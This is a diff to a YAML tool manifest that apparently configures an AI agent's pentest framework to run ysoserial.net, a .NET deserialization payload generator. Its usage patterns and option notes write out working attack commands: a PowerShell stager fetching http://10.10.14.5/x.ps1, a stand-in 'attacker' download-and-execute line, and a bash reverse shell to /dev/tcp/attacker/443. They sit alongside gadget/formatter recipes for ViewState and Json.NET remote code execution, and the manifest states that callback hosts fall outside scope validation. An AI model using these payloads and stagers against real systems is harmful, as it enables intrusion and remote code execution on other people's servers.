@@ -1,9 +1,24 @@
 name: ysoserial
+kind: cli
+binary: ysoserial
 version: "1.36"
-description: ".NET deserialization gadget chain generator via ysoserial.net v1.36. 3 methods: list_gadgets (30+ chains with compatible formatters — WindowsIdentity, TypeConfuseDelegate, TextFormattingRunProperties, ObjectDataProvider, etc.), list_formatters (BinaryFormatter, JavaScriptSerializer, Json.NET, SoapFormatter, LosFormatter, DataContractSerializer, XmlSerializer, etc. with their compatible gadgets), generate (create serialized .NET payload with output format options: raw, base64, hex). For PHP deserialization use phpggc. For exploit delivery use curl or exploit-runner."
+description: ".NET deserialization gadget chain generator via ysoserial.net v1.36 — generates serialized .NET payloads for ~30 gadget chains (TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, TextFormattingRunProperties, RolePrincipal, ActivitySurrogateSelector, etc.) across ~10 formatters (BinaryFormatter, JavaScriptSerializer, Json.Net, SoapFormatter, LosFormatter, DataContractSerializer, XmlSerializer, NetDataContractSerializer, ObjectStateFormatter, Yaml.Net). Operates ENTIRELY OFFLINE — there is no network target. The agent supplies a gadget (`-g`), a formatter (`-f`), and an OS COMMAND (`-c`) to embed in the payload; ysoserial returns the serialized payload to stdout (default base64). The 'command' embedded in the payload is the RCE that fires when the target deserializes the bytes — NOT a target the agent attacks directly. NOTE: this image is the .NET fork (pwntester/ysoserial.net via mono); for Java deserialization use exploit-runner with ysoserial-java; for PHP use phpggc."
 image: "ghcr.io/silicon-works/mcp-tools-ysoserial:latest"
 image_size_mb: 500
-timeout_seconds: 60
+# Dual-clock model:
+#   idle_timeout_seconds — silence between MCP heartbeats. ysoserial.net
+#     payload generation is fast (sub-second to a few seconds for most
+#     gadget/formatter combos); 60s silent = stuck (e.g., mono runtime
+#     hung, --test mode launching the embedded command and blocking on
+#     I/O, a malformed assembly reference).
+#   max_runtime_seconds  — hard wall-clock cap; never resets on heartbeat.
+#     5 min covers `--test` (which actually runs the command), worst-case
+#     SoapFormatter / NetDataContractSerializer XML reflection, and cold
+#     mono-JIT startup on first invocation.
+# Legacy `timeout_seconds` is used by older clients as the hard cap.
+idle_timeout_seconds: 60
+max_runtime_seconds: 300
+timeout_seconds: 300
 
 capabilities:
   - dotnet_deserialization
@@ -13,6 +28,43 @@ capabilities:
 phases:
   - exploitation
 
+routing:
+  use_for:
+    - "generate .NET deserialization payloads for BinaryFormatter, JavaScriptSerializer, Json.NET vulnerabilities"
+    - "create gadget chains for .NET applications (ASP.NET ViewState, WCF, Remoting, REST APIs)"
+    - "exploit insecure deserialization in .NET ViewState, cookies, or API endpoints"
+    - "list available .NET gadget chains and their compatible formatters"
+    - "build base64 / hex / raw .NET payloads with an embedded OS command"
+  never_use_for:
+    - task: "Java deserialization payloads (ysoserial-java)"
+      use_instead: "exploit-runner with ysoserial-java jar"
+      reason: "This image is ysoserial.NET (the .NET fork). Java ysoserial generates Java serialized objects (CommonsCollections, URLDNS, Hibernate, JRMPClient, etc.) — a different format, gadget set, and binary."
+    - task: "PHP deserialization payloads"
+      use_instead: "phpggc"
+      reason: "PHP deserialization uses phpggc (PHP Generic Gadget Chains). Different ecosystem."
+    - task: "Delivering / running the payload"
+      use_instead: "curl, exploit-runner"
+      reason: "ysoserial only GENERATES the serialized bytes. Delivery (cookie injection, ViewState POST, REST body) is a separate step via curl or exploit-runner."
+    - task: ".NET binary decompilation"
+      use_instead: "ilspy"
+      reason: "ilspy decompiles .NET assemblies to C# source so you can identify which formatter the target uses. Then ysoserial generates the matching payload."
+  triggers:
+    - "ysoserial"
+    - "ysoserial.net"
+    - ".NET deserialization"
+    - "BinaryFormatter"
+    - "JavaScriptSerializer"
+    - "Json.NET deserialization"
+    - "SoapFormatter"
+    - "LosFormatter"
+    - "ObjectStateFormatter"
+    - "ViewState deserialization"
+    - ".NET gadget chain"
+    - "TypeConfuseDelegate"
+    - "ObjectDataProvider"
+    - "insecure deserialization .NET"
+  prefer_over: []
+
 requirements:
   network: false
   privileged: false
@@ -21,97 +73,217 @@ resources:
   memory_mb: 256
   cpu: 0.5
 
-routing:
-  use_for:
-    - "generate .NET deserialization payloads for BinaryFormatter, JavaScriptSerializer, Json.NET vulnerabilities"
-    - "create gadget chains for .NET applications (ASP.NET, WCF, Remoting)"
-    - "exploit insecure deserialization in .NET ViewState, cookies, or API endpoints"
-    - "list available .NET gadget chains and their compatible formatters"
-  never_use_for:
-    - "PHP deserialization (use phpggc)"
-    - "Java deserialization (use exploit-runner with ysoserial-java)"
-    - "running or delivering exploits (use curl or exploit-runner — ysoserial only generates the payload)"
-    - ".NET binary decompilation (use ilspy)"
-  triggers:
-    - ysoserial
-    - .NET deserialization
-    - BinaryFormatter
-    - JavaScriptSerializer
-    - Json.NET deserialization
-    - SoapFormatter
-    - LosFormatter
-    - ViewState deserialization
-    - .NET gadget chain
-    - insecure deserialization .NET
-  prefer_over: []
-
 see_also:
   - tool: phpggc
-    reason: ysoserial is for .NET deserialization. phpggc is for PHP deserialization. Different ecosystems.
+    reason: "ysoserial.net is for .NET deserialization. phpggc is for PHP deserialization. Different ecosystems and formats."
   - tool: ilspy
-    reason: Use ilspy to decompile .NET assemblies to understand which formatter/gadget the target uses. Then use ysoserial to generate the payload.
+    reason: "Use ilspy to decompile .NET assemblies and identify which formatter / gadget chain the target uses (e.g., spotting `BinaryFormatter.Deserialize` calls or `LosFormatter` ViewState handlers). Then use ysoserial to generate the matching payload."
   - tool: curl
-    reason: Use ysoserial to generate the payload, then curl to deliver it (e.g., as a base64 cookie value or JSON body).
+    reason: "Use ysoserial to generate the payload, then curl to deliver it (e.g., as a base64 cookie value, JSON body, or ViewState POST parameter)."
+  - tool: exploit-runner
+    reason: "For complex multi-step delivery (custom protocols, auth, multi-request flows) hand the payload to exploit-runner instead of curl."
 
-methods:
-  list_gadgets:
-    description: "List all available .NET gadget chains with their descriptions and compatible formatters."
-    when_to_use: "First step after confirming .NET deserialization — check which gadgets are available and which formatters they support."
-    params: {}
-    returns:
-      gadgets:
-        type: array
-        description: "Available gadgets, each with: name, description, formatters (list of compatible formatters)."
-      gadget_count:
-        type: integer
-        description: "Total number of available gadgets."
-      gadget_names:
-        type: array
-        description: "Just the gadget names for quick reference."
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  list_formatters:
-    description: "List all available .NET serialization formatters and which gadgets work with each."
-    when_to_use: "When you know which formatter the target uses (from ilspy decompilation or error messages) — find compatible gadgets."
-    params: {}
-    returns:
-      formatters:
-        type: array
-        description: "Available formatter names."
-      formatter_count:
-        type: integer
-        description: "Total number of formatters."
-      formatter_gadgets:
-        type: object
-        description: "Map of formatter → list of compatible gadget names."
+target_extraction:
+  # ysoserial.net has NO network target. Its operation is purely local
+  # gadget-chain serialization: gadget (-g), formatter (-f), and an OS
+  # command (-c) to embed inside the payload. None of these are network
+  # endpoints in the OpenSploit sense:
+  #   - gadget names are KEYWORDS (TypeConfuseDelegate, ObjectDataProvider, ...)
+  #   - formatter names are KEYWORDS (BinaryFormatter, Json.Net, ...)
+  #   - the -c command is the OS COMMAND that fires when the target
+  #     deserializes the payload. It MAY contain a host/IP/URL (e.g.,
+  #     `bash -i >& /dev/tcp/attacker/443 0>&1` or
+  #     `powershell -nop -c "iwr http://attacker/x | iex"`), but those
+  #     are EGRESS / ATTACKER-CALLBACK endpoints, NOT the engagement-
+  #     scope target the agent is attacking.
+  #
+  # Decision: declare NO target_extraction rules. The plugin extracts
+  # target=null. The downstream gotcha note explains that scope-validation
+  # is N/A for ysoserial because the operation is purely local payload
+  # generation. Same shape as ilspy / john / hashcat / volatility.
+  #
+  # An IP-shaped or URL-shaped string inside `-c "<command>"` should NOT
+  # be auto-extracted as a target. See open question #5 in scenarios.md
+  # for engagement-scope handling of attacker-callback endpoints.
+  []
 
-  generate:
-    description: "Generate a serialized .NET deserialization payload for a specific gadget chain and formatter. Returns the payload in base64, hex, or raw format."
-    when_to_use: "After identifying the target formatter (from ilspy decompilation, error messages, or known framework). Choose a compatible gadget from list_gadgets, set the command to execute, and generate the payload. Use base64 output for cookie injection, raw for binary protocols."
-    params:
-      gadget:
-        type: string
-        required: true
-        description: "Gadget chain name (e.g., 'WindowsIdentity', 'TypeConfuseDelegate', 'TextFormattingRunProperties')."
-      formatter:
-        type: string
-        required: true
-        description: "Serialization formatter (e.g., 'Json.Net', 'BinaryFormatter', 'JavaScriptSerializer')."
-      command:
-        type: string
-        required: true
-        description: "OS command to execute (e.g., 'calc', 'cmd /c whoami', 'powershell -e <base64>')."
-      output_format:
-        type: string
-        default: "base64"
-        description: "Output format: raw (binary), base64, hex."
-      minify:
-        type: boolean
-        default: false
-        description: "Minify output (remove whitespace from JSON/XML formatters)."
-    returns:
-      payload:
-        type: string
-        description: "The serialized .NET payload (ready to deliver)."
-      payload_length:
-        type: integer
-        description: "Payload length in characters."
+# ysoserial has no target-list flag analog. The operands are gadget and
+# formatter KEYWORDS plus an OS command STRING. Wordlists, output paths,
+# and references don't apply. There is no scope-validation surface.
+reject_flags: []
+reject_flags_reason: "ysoserial.net has no network target and no target-list flag. Its operands are gadget / formatter keywords (-g / -f) and an OS command string (-c). The IP / URL embedded inside the -c command is the ATTACKER-CALLBACK endpoint (egress for the eventual RCE), NOT a target being attacked by ysoserial itself. There is no scope-validation surface to protect at the ysoserial layer."
+
+# Per-tool value-taking flags whose values must NOT be confused with
+# anything else. Verified against the ysoserial.net 1.36 source
+# (ysoserial.exe -h) — uses single-dash short flags throughout.
+value_flags:
+  # Core gadget / formatter / command (the three required positional-shaped
+  # value-flag triples).
+  - "-g"          # gadget chain name (e.g., TypeConfuseDelegate, ObjectDataProvider)
+  - "--gadget"    # long form
+  - "-f"          # formatter name (e.g., BinaryFormatter, Json.Net, LosFormatter)
+  - "--formatter" # long form
+  - "-c"          # OS command string to embed (e.g., "calc", "powershell -e <b64>")
+  - "--command"   # long form
+  # Output format (raw | base64 | hex). Values are KEYWORDS, not paths.
+  - "-o"          # output format selector — NOT an output PATH (different from john / nuclei)
+  - "--output"    # long form
+  # Plugin / mode selectors (some 1.36 forks). Listed for safety.
+  - "-p"          # plugin mode (e.g., ActivatorUrl, AltSerializer, ApplicationTrust, Clipboard, DotNetNuke,
+                  #              SessionSecurityToken, ResourceSet, Shieldsoft / SharePoint, ViewState).
+                  # Plugins build payloads for specific vuln classes that need
+                  # context beyond gadget+formatter (e.g., ViewState plugin
+                  # encrypts with __VIEWSTATEUSERKEY).
+  - "--plugin"    # long form
+  - "-t"          # plugin-test target (only used by some plugins; rarely set on command line — usually a URL).
+                  # Listed so an arg-shape like `-t http://x/y` doesn't get
+                  # misinterpreted as a positional. NOT extracted as a target
+                  # because plugin-test mode is not the standard generate flow
+                  # and `-t` here is a plugin-specific selector, not a network
+                  # operation.
+  # Boolean / no-value flags — listed for completeness so they are NOT
+  # mis-parsed as taking the next argv as a value.
+  - "--minify"    # boolean — minify JSON / XML output
+  - "--test"      # boolean — execute the embedded command locally to verify
+                  # the gadget actually fires. WARNING: literally runs the
+                  # command on the host running ysoserial.
+  - "--bridgefile" # some forks: file path for plugin bridges. Listed for safety.
+  - "--rawcmd"    # boolean — pass the command verbatim (no auto-quoting).
+  - "--ust"       # boolean — UseSimpleType (Json.Net specific).
+  - "--islogtype" # boolean — emits gadget-list output instead of payload.
+  - "--showall"   # boolean — list every gadget AND formatter (used with -h).
+  - "-h"          # help (boolean)
+  - "--help"      # long form
+
+usage_patterns:
+  - name: "List available gadgets and formatters (smoke test)"
+    command: "ysoserial -h"
+    when: "First-call smoke test. Prints the full ysoserial.net usage AND the gadget table (each gadget with its (*) marker and its compatible Formatters: list). Use to confirm the binary is on PATH, mono runtime is functional, and the bundled ysoserial.exe is intact. ALSO use to discover gadget/formatter compatibility before constructing a payload (the (*) gadgets are the well-tested ones; alongside each gadget the Formatters: line lists every compatible formatter)."
+
+  - name: "Generate a base64 BinaryFormatter payload (calc.exe RCE smoke test)"
+    command: "ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" -o base64"
+    when: "Canonical .NET deserialization smoke test. TypeConfuseDelegate is the most widely supported gadget; BinaryFormatter is the most common vulnerable formatter (still default in legacy WCF, .NET Remoting, and many ASP.NET serialization sinks). `-c \"calc\"` pops Windows calc.exe — a benign indicator of execution. Output is base64-encoded serialized bytes; deliver via curl as a cookie value, ViewState parameter, or POST body. Equivalent for Linux targets: `-c \"xterm\"` or any other harmless command."
+
+  - name: "Generate a Json.Net payload for REST API exploitation"
+    command: "ysoserial -g ObjectDataProvider -f Json.Net -c \"powershell -nop -w hidden -c iex(iwr http://10.10.14.5/x.ps1)\" -o base64 --minify"
+    when: "ObjectDataProvider + Json.Net is the canonical pairing for Newtonsoft Json.NET (TypeNameHandling != None) RCE. --minify removes whitespace from the JSON payload (smaller wire footprint, less likely to break length-limited fields). The PowerShell stager fetches a follow-on script from the attacker callback. NOTE: the URL inside -c is an EGRESS / attacker-callback endpoint, NOT an engagement-scope target — ysoserial does not scope-validate it. Verify the callback host is yours before generating."
+
+  - name: "Generate a LosFormatter ViewState payload for ASP.NET WebForms"
+    command: "ysoserial -g TextFormattingRunProperties -f LosFormatter -c \"cmd /c whoami > C:\\\\windows\\\\temp\\\\out.txt\" -o base64"
+    when: "LosFormatter + TextFormattingRunProperties is the classic pairing for ASP.NET WebForms ViewState exploitation when machineKey is known or omitted. Deliver as the __VIEWSTATE POST parameter. For machineKey-encrypted ViewState, use the dedicated ViewState plugin (`-p ViewState`) instead — it handles HMAC and encryption layers."
+
+  - name: "Generate a SoapFormatter payload"
+    command: "ysoserial -g WindowsIdentity -f SoapFormatter -c \"calc\" -o raw"
+    when: "SoapFormatter is occasionally seen in legacy .NET Remoting and WCF SOAP endpoints. `-o raw` emits the serialized bytes directly (no base64 wrapper); useful for binary protocols where the agent will hex-encode or splice the bytes into a request body. Capture stdout to a file via run_cli's `output_path` (the bytes contain non-printable characters that won't survive JSON serialization)."
+
+  - name: "Generate a hex-encoded payload for embedding in scripts"
+    command: "ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c \"powershell -e <b64stub>\" -o hex"
+    when: "Hex output for embedding the payload into a PowerShell / Python / C# delivery harness. Each byte becomes a 2-char hex pair; trivial to convert to a byte[] in any language. Use when base64 isn't safe for the transport (e.g., URL contexts where + / / get URL-encoded, or fixed-width binary protocols)."
+
+  - name: "Generate using a plugin (e.g., ApplicationTrust)"
+    command: "ysoserial -p ApplicationTrust -c \"calc\" -o base64"
+    when: "Plugins package gadget+formatter combinations with extra context for specific vulnerable surfaces. Examples: `-p ActivatorUrl` (ASP.NET activation cookies), `-p ApplicationTrust` (.NET ClickOnce trust manifests), `-p Clipboard` (DataObject deserialization), `-p DotNetNuke` (DNN Cookie deserialization, CVE-2017-9822), `-p SessionSecurityToken` (WIF SessionSecurityToken — used in ADFS), `-p ViewState` (WebForms with MachineKey handling), `-p Yaml` (YamlDotNet). Plugins do NOT take -g / -f; they pick internally. List plugins with `ysoserial -p`."
+
+  - name: "Verify gadget actually fires (--test, dangerous)"
+    command: "ysoserial -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" --test"
+    when: "WARNING: --test ACTUALLY DESERIALIZES the generated payload locally to verify the gadget fires (i.e., literally runs `-c \"calc\"` on the container running ysoserial). Use to validate gadget compatibility BEFORE shipping the payload to the target — ensures the gadget+formatter combo isn't broken in this build. Pick benign commands (`calc`, `whoami`); never run --test with destructive `-c` strings."
+
+output_formats:
+  # ysoserial.net's "output" is the serialized payload itself, NOT a
+  # tabular result. The agent picks the wire encoding via -o:
+  - flag: "-o base64"
+    format: "base64"
+    preferred: true   # default for cookie / header / JSON injection contexts
+  - flag: "--output base64"
+    format: "base64"
+    preferred: true   # long form
+  - flag: "-o raw"
+    format: "raw_binary"
+    preferred: false  # binary bytes — capture via run_cli output_path; not safe in stdout JSON payload
+  - flag: "--output raw"
+    format: "raw_binary"
+    preferred: false
+  - flag: "-o hex"
+    format: "hex"
+    preferred: false  # 2-char-per-byte hex — useful for script embedding
+
+common_options:
+  gadget:
+    - "-g NAME / --gadget NAME: gadget chain selector. Common values: `TypeConfuseDelegate` (most universal), `ObjectDataProvider` (Json.Net / DataContractSerializer / NetDataContractSerializer / SoapFormatter / Yaml / WindowsClaimsIdentity), `WindowsIdentity` (BinaryFormatter / SoapFormatter via Json.Net), `TextFormattingRunProperties` (LosFormatter / ObjectStateFormatter — ASP.NET WebForms ViewState), `RolePrincipal` (BinaryFormatter), `ActivitySurrogateSelector` (BinaryFormatter — pre-July-2017 unpatched only), `PSObject` (BinaryFormatter — Windows-specific). Run `ysoserial -h` to see the full table."
+  formatter:
+    - "-f NAME / --formatter NAME: serialization formatter. Common values: `BinaryFormatter` (most common .NET deserialization sink — still default in legacy WCF, .NET Remoting), `Json.Net` (Newtonsoft Json.NET with TypeNameHandling != None), `JavaScriptSerializer` (legacy ASP.NET cookies), `LosFormatter` (ASP.NET WebForms ViewState), `ObjectStateFormatter` (newer ASP.NET WebForms ViewState), `SoapFormatter` (legacy SOAP), `DataContractSerializer` (WCF DataContract — KnownType abuse), `NetDataContractSerializer` (WCF NetDataContract), `XmlSerializer` (XmlSerializer KnownType abuse), `Yaml.Net` (rare). Pair with `-g` per the gadget's compatible-formatter list."
+  command:
+    - "-c CMD / --command CMD: OS command to execute upon deserialization. Quote multi-word commands. Examples: `\"calc\"` (Windows benign indicator), `\"xterm\"` (Linux benign indicator), `\"cmd /c whoami > C:\\windows\\temp\\out.txt\"` (Windows file-write), `\"powershell -nop -w hidden -c iex(iwr http://attacker/x.ps1)\"` (Windows PowerShell stager), `\"bash -c '/bin/bash -i >& /dev/tcp/attacker/443 0>&1'\"` (Linux reverse shell). The command runs in the TARGET's context when it deserializes — choose syntax accordingly."
+  output:
+    - "-o FORMAT / --output FORMAT: output encoding. Values: `base64` (default — safe for cookies, JSON, headers), `raw` (binary bytes — capture via run_cli output_path; do NOT print to stdout in MCP payloads — non-printable bytes break the JSON envelope), `hex` (2-char-per-byte — for script embedding)."
+  plugin:
+    - "-p NAME / --plugin NAME: plugin mode (instead of gadget+formatter). Values include `ActivatorUrl`, `ActivityCache`, `ApplicationTrust`, `Clipboard`, `DotNetNuke`, `Resco`, `ResourceSet`, `Rome`, `SessionSecurityToken`, `Shieldsoft`, `SharePoint`, `TypeConfuseDelegate`, `ViewState`, `Yaml`. Each plugin packages gadget + formatter + extra context (e.g., the ViewState plugin handles MachineKey HMAC/encryption). List plugins with `ysoserial -p`."
+  modifiers:
+    - "--minify: minify whitespace from JSON / XML formatters. Reduces payload size; useful when the transport has length limits."
+    - "--test: actually deserialize the payload locally to verify the gadget fires (runs `-c` on the container). Use for compatibility verification; NEVER with destructive commands."
+    - "--rawcmd: pass `-c` verbatim — no auto-quoting / escaping. Useful for very specific shell-syntax payloads."
+    - "--ust: UseSimpleType (Json.Net specific) — emits `$type` with simple type names instead of fully-qualified ones."
+
+gotchas:
+  - "ysoserial.net has NO NETWORK TARGET. Its operands are gadget keywords (-g), formatter keywords (-f), and an OS command string (-c). The IP / URL embedded inside the -c command is the ATTACKER-CALLBACK endpoint that fires when the target deserializes — NOT a target ysoserial itself attacks. target_extraction returns null; scope-validation is N/A. Same shape as ilspy / john / hashcat / volatility."
+  - "This image is the .NET fork (pwntester/ysoserial.net) — for Java deserialization (CommonsCollections, URLDNS, JRMPClient, Hibernate, etc.) you need ysoserial-java instead, delivered via exploit-runner. The two share a name and concept but are different binaries with different gadget chains and different formats."
+  - "Output is BINARY when -o raw is used. The serialized .NET bytes contain null bytes, control chars, and non-UTF-8 sequences that WILL break a JSON-wrapped MCP response. ALWAYS use -o base64 (default) or -o hex for stdout capture; reserve -o raw for run_cli `output_path` redirection to /session/<file>.bin."
+  - "STDOUT-PIPE GOTCHA: cli_in_container uses subprocess spawn with NO shell. A command like `ysoserial ... | base64` will NOT work. The shell metachar `|` is passed as a literal arg to ysoserial (which rejects it) or terminates the wrapper unexpectedly. To get base64, use `-o base64` directly (it's the default). To save raw bytes, use run_cli's `output_path` to redirect stdout to /session/<file>.bin."
+  - "Gadget / formatter compatibility is constrained — not every gadget works with every formatter. `ysoserial -h` lists each gadget with its compatible Formatters: line. Common error: pairing `WindowsIdentity` with `Json.Net` works but `WindowsIdentity` with `LosFormatter` does NOT. Mismatch produces stderr like `Gadget X is not compatible with formatter Y` (failure_signature)."
+  - "The .NET fork uses single-dash short flags THROUGHOUT (-g / -f / -c / -o / -p) — DOUBLE-DASH long forms (--gadget, --formatter, --command, --output, --plugin) work but are uncommon in published PoCs. The Java fork uses positional gadget+command. Don't conflate the two."
+  - "`-o` selects an OUTPUT FORMAT (base64 / raw / hex), NOT an output PATH. Common confusion with john / nuclei / nikto where `-o` is a file path. To save the payload to a file, use run_cli's `output_path` argument (or shell-redirect `>` if the wrapper supported it — it doesn't)."
+  - "TypeConfuseDelegate is the most universally compatible gadget — works with BinaryFormatter, ObjectStateFormatter, NetDataContractSerializer, LosFormatter, SoapFormatter, etc. Start with TypeConfuseDelegate; fall back to ObjectDataProvider / WindowsIdentity / TextFormattingRunProperties if the formatter requires something specific."
+  - "ASP.NET ViewState exploitation has its own plugin: `-p ViewState`. Use this (not `-g TextFormattingRunProperties -f LosFormatter`) when MachineKey HMAC / encryption is in play — the plugin handles validationKey, decryptionKey, validation algorithm, and decryption algorithm. Without the keys you get an unsigned/unencrypted payload that the server rejects."
+  - "The Json.Net formatter requires `TypeNameHandling != None` on the target side. If the target uses `TypeNameHandling.None` (the secure default since Newtonsoft 13.0.1+) the payload is parsed as plain JSON and the gadget never instantiates. Confirm the target uses `TypeNameHandling.Auto / All / Objects / Arrays` via decompilation (ilspy) before generating."
+  - "`--test` ACTUALLY EXECUTES the embedded `-c` command on the CONTAINER running ysoserial — it deserializes the payload locally to verify the gadget fires. Use only with benign commands (`calc`, `whoami`); never with `rm -rf /`, reverse shells back to attacker infrastructure, or anything destructive."
+  - "Mono cold-start adds ~1-2s to the first invocation in a fresh container. Subsequent invocations are sub-second. The dual-clock idle timeout (60s) is generous enough to cover cold-start + payload generation; if the call exceeds 60s silent something is wrong (mono crashed, --test command hung)."
+  - "BinaryFormatter is OBSOLETED in .NET 5+ (with warnings) and REMOVED in .NET 9+. Targets running modern .NET runtimes won't be vulnerable to BinaryFormatter payloads even if the source code calls it — the runtime throws NotSupportedException. Confirm the target's runtime version (often visible in HTTP headers or assembly references) before betting on BinaryFormatter."
+  - "STDOUT TRAILING NEWLINE: ysoserial.exe writes the payload followed by a trailing `\\n`. The legacy MCP server stripped this with `stdout.rstrip(\"\\n\")` before returning. Under kind:cli the raw stdout is captured verbatim — the trailing newline survives. Strip it client-side before pasting the base64 / hex payload into a cookie / header / JSON field; otherwise some HTTP libraries percent-encode the `\\n` as `%0A` and break the payload."
+  - "PARSING `ysoserial -h`: the legacy MCP server provided structured `list_gadgets` and `list_formatters` methods that regex-parsed the help text into JSON (each gadget with a `formatters` array; reverse-map of `formatter -> [gadgets]`). Under kind:cli the agent receives the RAW `-h` banner and must parse it itself. Format reminder: each gadget appears on a line like `\\t(*) GadgetName [description]` followed by `\\t\\tFormatters: BinaryFormatter, LosFormatter, Json.Net (2)` — comma-separated, with optional `(N)` count suffixes that must be stripped. The `(*)` marker indicates well-tested gadgets."
+
+failure_signatures:
+  # Layer-diverse signals (SKILL #11):
+  #   - Argument / parser layer (mono argparse rejects flags or unknown gadget/formatter values)
+  #   - Compatibility layer (gadget X not compatible with formatter Y)
+  #   - Mono runtime layer (assembly load failures, JIT crashes)
+  #   - File / I/O layer (referenced files / plugins missing)
+  #   - --test execution layer (the embedded -c command can fail to spawn)
+  #   - Help / usage fallback (no args prints usage; wrong args print usage)
+  - signal: "Gadget .* is not compatible with formatter"
+    remediation: "The selected gadget cannot be serialized with the selected formatter. Run `ysoserial -h` to see each gadget's compatible Formatters: line. Common pairings: TypeConfuseDelegate + BinaryFormatter; ObjectDataProvider + Json.Net / DataContractSerializer; TextFormattingRunProperties + LosFormatter / ObjectStateFormatter; WindowsIdentity + BinaryFormatter / Json.Net."
+  - signal: "(?i)not supported"
+    remediation: "Some ysoserial.net builds emit `not supported` (rather than `not compatible`) when a gadget+formatter combination is rejected. Same remediation as the compatibility signal: run `ysoserial -h` and consult the gadget's Formatters: line. The legacy MCP server classified BOTH `not compatible` and `not supported` (case-insensitive) as the same compatibility error — keep both signals."
+  - signal: "Unknown gadget"
+    remediation: "`-g` value is not a known gadget chain. Run `ysoserial -h` to see the full gadget list. Names are case-sensitive — `TypeConfuseDelegate` is correct; `typeconfusedelegate` or `Type_Confuse_Delegate` will be rejected."
+  - signal: "Unknown formatter"
+    remediation: "`-f` value is not a known formatter. Run `ysoserial -h` to see the full formatter list. Names ARE case-sensitive and use specific spelling — `Json.Net` (with the dot), `BinaryFormatter`, `JavaScriptSerializer`, `LosFormatter`. `JsonNet` or `JSON.NET` are rejected."
+  - signal: "No such option"
+    remediation: "Mono's argparse rejected an unknown flag. The .NET fork uses `-g`, `-f`, `-c`, `-o`, `-p`, `--minify`, `--test`. Don't confuse with the Java fork (which uses positional args). Run `ysoserial -h` for the full flag list."
+  - signal: "Required argument"
+    remediation: "Missing required arg — usually `-g`, `-f`, or `-c` not supplied. ysoserial's normal generate flow requires all three (gadget + formatter + command). Plugin mode (`-p NAME`) requires only `-c` (plugin picks the gadget+formatter internally)."
+  - signal: "Could not load file or assembly"
+    remediation: "Mono runtime can't locate a .NET assembly the gadget references. Usually means the bundled ysoserial.exe install is incomplete. Re-pull the image or verify `/opt/ysoserial/Release/ysoserial.exe` exists with `ls -la /opt/ysoserial/Release/`."
+  - signal: "FileNotFoundException"
+    remediation: "Plugin or gadget references a file that doesn't exist. Check the bundled ysoserial.exe install at `/opt/ysoserial/Release/`. Some plugins (Bridge, ResourceSet) accept file paths; verify any `--bridgefile` / similar argument is correct."
+  - signal: "BadImageFormatException"
+    remediation: "Mono couldn't load ysoserial.exe as a managed assembly — the binary is corrupt or the wrong architecture. Rebuild the image; if it persists, re-pull the upstream ysoserial.net release."
+  - signal: "Usage:"
+    remediation: "ysoserial printed its usage banner — usually because no args were given OR the supplied args couldn't be parsed. Re-construct the command with `-g <gadget> -f <formatter> -c <command>` (or `-p <plugin> -c <command>`)."
+  - signal: "command not found"
+    remediation: "The `ysoserial` wrapper isn't on PATH. The image installs `/usr/local/bin/ysoserial` (a thin sh script that exec's `mono /opt/ysoserial/Release/ysoserial.exe`). If missing, the container build is broken — rebuild from the Dockerfile."
+  - signal: "Stack overflow"
+    remediation: "Mono runtime crashed with a stack overflow during gadget reflection — rare but happens on pathological gadget+formatter combinations. Try a different gadget or formatter; if reproducible, file a bug against pwntester/ysoserial.net upstream."
+  - signal: "NullReferenceException"
+    remediation: "Mono runtime hit a null pointer — usually a gadget bug for an obscure plugin. Try a different gadget (e.g., switch from RolePrincipal to TypeConfuseDelegate). For plugin-mode runs, try a different plugin or omit `-p` and use the gadget+formatter form."
+
+help_commands:
+  - command: "ysoserial -h"
+    purpose: "Top-level help — prints the full usage AND the gadget/formatter compatibility table. ALSO use as a targetless smoke test that mono and the bundled ysoserial.exe are functional."
+  - command: "ysoserial --help"
+    purpose: "Long form of -h — same output."
+  - command: "ysoserial"
+    purpose: "Bare invocation prints the usage banner and exits non-zero. Functionally equivalent to -h for discovery (with non-zero exit)."
+  - command: "ysoserial -p"
+    purpose: "List available plugins (no plugin name = list mode). Use to discover plugin names for `-p NAME` usage."
